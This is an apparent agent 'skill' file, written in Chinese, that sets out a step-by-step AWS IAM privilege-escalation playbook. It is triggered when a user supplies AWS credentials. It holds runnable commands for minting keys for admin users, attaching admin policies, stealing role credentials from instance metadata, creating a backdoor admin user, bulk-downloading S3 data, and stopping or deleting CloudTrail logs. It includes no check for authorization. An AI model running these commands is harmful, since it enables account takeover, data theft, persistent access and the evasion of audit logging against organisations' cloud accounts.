---
name: aws-iam-attack
type: attack
category: privilege-escalation
platform: aws
severity: critical
---

# AWS IAM 权限攻击技能

## 触发条件

当满足以下任一条件时激活此技能：

- 用户提供了 AWS 凭证（Access Key ID + Secret Access Key）
- 用户要求"测试 AWS IAM 权限"
- 用户要求"提升 AWS 权限"
- 发现 IAM 相关权限（iam:*）

## 前置检查

在执行攻击前，必须完成以下检查：

```bash
# 1. 验证凭证有效性
aws sts get-caller-identity
# 如果返回账户信息，凭证有效；否则报错

# 2. 检查当前用户身份
aws sts get-caller-identity --query 'Arn'

# 3. 列出当前用户的所有策略
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | awk -F/ '{print $NF}')
aws iam list-user-policies --user-name USERNAME

# 4. 枚举所有可用权限（使用 enumerate-iam 工具）
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
```

## 攻击决策流程

按以下优先级检查权限并执行攻击：

### 优先级 1: 创建访问密钥权限

**检查命令**:
```bash
# 检查是否有 iam:CreateAccessKey 权限
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query 'Arn' --output text) \
  --action-names iam:CreateAccessKey \
  --resource-arns "*"
```

**如果有权限，执行**:
```bash
# 1. 列出所有用户
aws iam list-users --query 'Users[].UserName'

# 2. 查找高权限用户
for user in $(aws iam list-users --query 'Users[].UserName' --output text); do
    echo "检查用户: $user"
    aws iam list-attached-user-policies --user-name $user
    aws iam list-user-policies --user-name $user
done

# 3. 选择高权限用户（有 AdministratorAccess 或类似策略的用户）
# 4. 为该用户创建访问密钥
aws iam create-access-key --user-name target-admin-user

# 5. 保存返回的 AccessKeyId 和 SecretAccessKey

# 6. 验证新凭证权限
aws configure --profile stolen-admin
aws sts get-caller-identity --profile stolen-admin
```

**验证成功**:
```bash
# 如果新凭证有管理员权限，攻击成功
aws iam list-attached-user-policies --profile stolen-admin --user-name target-admin-user
# 应该看到 AdministratorAccess 或类似高权限策略
```

**如果失败**:
```bash
# 检查是否已达到密钥限制（每个用户最多 2 个）
aws iam list-access-keys --user-name target-admin-user
# 如果已有 2 个密钥，需要先删除一个
aws iam delete-access-key --access-key-id KEY_ID --user-name target-admin-user
# 然后重新创建
```

---

### 优先级 2: 创建登录配置文件权限

**检查命令**:
```bash
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query 'Arn' --output text) \
  --action-names iam:CreateLoginProfile \
  --resource-arns "*"
```

**如果有权限，执行**:
```bash
# 1. 检查用户是否已有登录配置文件
aws iam get-login-profile --user-name target-user
# 如果返回 "NoSuchEntity"，可以创建

# 2. 创建登录配置文件
aws iam create-login-profile \
  --user-name target-user \
  --password 'P@ssw0rd!123' \
  --password-reset-required false

# 3. 通过控制台登录验证
# URL: https://ACCOUNT_ID.signin.aws.amazon.com/console/
```

**验证成功**:
```bash
# 能够使用设置的用户名和密码登录 AWS 控制台
# 如果能看到所有服务，攻击成功
```

---

### 优先级 3: 附加用户策略权限

**检查命令**:
```bash
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query 'Arn' --output text) \
  --action-names iam:AttachUserPolicy \
  --resource-arns "*"
```

**如果有权限，执行**:
```bash
# 1. 创建管理员策略 JSON
cat > admin-policy.json <<EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
EOF

# 2. 为自己附加管理员策略
aws iam attach-user-policy \
  --user-name $(aws sts get-caller-identity --query 'Arn' --output text | awk -F/ '{print $NF}') \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. 验证策略已附加
aws iam list-attached-user-policies --user-name USERNAME
```

**验证成功**:
```bash
# 尝试执行需要管理员权限的操作
aws iam list-users
# 如果成功，说明已获得管理员权限
```

---

### 优先级 4: 创建内联策略权限

**检查命令**:
```bash
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query 'Arn' --output text) \
  --action-names iam:PutUserPolicy \
  --resource-arns "*"
```

**如果有权限，执行**:
```bash
# 1. 创建内联策略
cat > full-admin-policy.json <<EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
EOF

# 2. 为自己添加内联策略
aws iam put-user-policy \
  --user-name $(aws sts get-caller-identity --query 'Arn' --output text | awk -F/ '{print $NF}') \
  --policy-name FullAdminPolicy \
  --policy-document file://full-admin-policy.json

# 3. 验证策略已添加
aws iam get-user-policy --user-name USERNAME --policy-name FullAdminPolicy
```

**验证成功**:
```bash
# 测试管理员权限
aws iam delete-user --user-name test-user
# 如果成功或返回 "NoSuchEntity" 以外的错误，说明有管理员权限
```

---

### 优先级 5: 添加到用户组权限

**检查命令**:
```bash
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query 'Arn' --output text) \
  --action-names iam:AddUserToGroup \
  --resource-arns "*"
```

**如果有权限，执行**:
```bash
# 1. 列出所有用户组
aws iam list-groups

# 2. 检查用户组权限
for group in $(aws iam list-groups --query 'Groups[].GroupName' --output text); do
    echo "检查组: $group"
    aws iam list-attached-group-policies --group-name $group
    aws iam get-group-policy --group-name $group --policy-name AdminPolicy
done

# 3. 将自己添加到管理员组
aws iam add-user-to-group \
  --group-name Administrators \
  --user-name $(aws sts get-caller-identity --query 'Arn' --output text | awk -F/ '{print $NF}')

# 4. 验证
aws iam list-groups-for-user --user-name USERNAME
```

**验证成功**:
```bash
# 检查组的权限
aws iam list-attached-group-policies --group-name Administrators
# 应该看到管理员策略
```

---

### 优先级 6: PassRole + RunInstances

**检查命令**:
```bash
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query 'Arn' --output text) \
  --action-names iam:PassRole,ec2:RunInstances \
  --resource-arns "*"
```

**如果有权限，执行**:
```bash
# 1. 列出可用的 Instance Profiles
aws iam list-instance-profiles

# 2. 检查 Instance Profile 关联的角色
for profile in $(aws iam list-instance-profiles --query 'InstanceProfiles[].InstanceProfileName' --output text); do
    echo "检查 Profile: $profile"
    aws iam get-instance-profile --instance-profile-name $profile
done

# 3. 选择高权限 Profile 并启动 EC2 实例
aws ec2 run-instances \
  --image-id ami-0c55b159cbfafe1f0 \
  --instance-type t2.micro \
  --iam-instance-profile Name=TargetInstanceProfile \
  --key-name my-key-pair

# 4. 等待实例启动
INSTANCE_ID=$(aws ec2 describe-instances \
  --filters "Name=instance.profile.arn,Like=*TargetInstanceProfile*" \
  --query 'Reservations[0].Instances[0].InstanceId' \
  --output text)

# 5. 通过 SSM Session Manager 连接（如果可用）
aws ssm start-session --target $INSTANCE_ID

# 或通过 SSH 连接
aws ec2 describe-instances --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].PublicIpAddress'
ssh -i my-key-pair.pem ubuntu@PUBLIC_IP

# 6. 在实例上访问元数据服务
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

**验证成功**:
```bash
# 获取到高权限角色的临时凭证
# 凭证应包含 AccessKeyId, SecretAccessKey, Token
```

---

## 攻击后操作

权限提升成功后，执行以下操作：

### 1. 建立持久化

```bash
# 创建后门用户
aws iam create-user --user-name backdoor-user
BACKDOOR_ARN=$(aws iam create-user --user-name backdoor-user --query 'User.Arn' --output text)

# 创建后门访问密钥
aws iam create-access-key --user-name backdoor-user

# 将后门用户添加到管理员组
aws iam add-user-to-group --group-name Administrators --user-name backdoor-user

# 或附加管理员策略
aws iam attach-user-policy \
  --user-name backdoor-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 2. 枚举所有资源

```bash
# 列出 EC2 实例
aws ec2 describe-instances

# 列出 S3 存储桶
aws s3 ls

# 列出 Lambda 函数
aws lambda list-functions

# 列出 RDS 实例
aws rds describe-db-instances
```

### 3. 搜索敏感数据

```bash
# S3 存储桶中搜索敏感文件
aws s3 ls s3://backup-bucket --recursive | grep -E '\.(env|pem|key|sql)$'

# 下载敏感文件
aws s3 sync s3://backup-bucket ./downloaded
```

### 4. 禁用日志

```bash
# 列出 CloudTrail
aws cloudtrail describe-trails

# 停止日志记录
aws cloudtrail stop-logging --name trail-name

# 删除 Trail（可选）
aws cloudtrail delete-trail --name trail-name
```

## 清理痕迹

```bash
# 删除测试资源
aws iam delete-access-key --access-key-id KEY_ID --user-name backdoor-user
aws iam delete-user --user-name backdoor-user

# 恢复 CloudTrail（如果修改了）
aws cloudtrail start-logging --name trail-name
```

## 常见错误处理

### 错误 1: "AccessDenied"

```bash
# 原因: 没有所需权限
# 解决: 尝试其他攻击方法
# 重新检查可用权限
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
```

### 错误 2: "LimitExceeded"

```bash
# 原因: 用户已达到资源限制（如访问密钥数量）
# 解决: 删除现有资源后重试
aws iam list-access-keys --user-name target-user
aws iam delete-access-key --access-key-id KEY_ID --user-name target-user
```

### 错误 3: "ValidationError"

```bash
# 原因: 输入参数错误
# 解决: 检查参数格式
aws iam create-access-key --help
```

## 输出报告

攻击完成后，生成以下报告：

```markdown
# AWS IAM 权限提升报告

## 目标账户
- Account ID: 123456789012
- 原始用户: original-user
- 提升方法: iam:CreateAccessKey

## 攻击结果
- ✅ 成功创建管理员访问密钥
- ✅ 获取管理员权限
- ✅ 建立持久化后门

## 影响范围
- 可访问所有 AWS 服务
- 可创建/删除/修改所有资源
- 可访问所有数据

## 建议
- 立即撤销泄露的访问密钥
- 审查所有用户权限
- 启用 MFA
- 启用 CloudTrail 日志
```

## 下一步行动

根据攻击结果，建议执行以下技能：

1. **aws-s3-attack** - 攻击 S3 存储桶
2. **aws-lambda-attack** - 攻击 Lambda 函数
3. **aws-metadata-attack** - 利用元数据服务
4. **aws-persistence** - 建立更多持久化后门
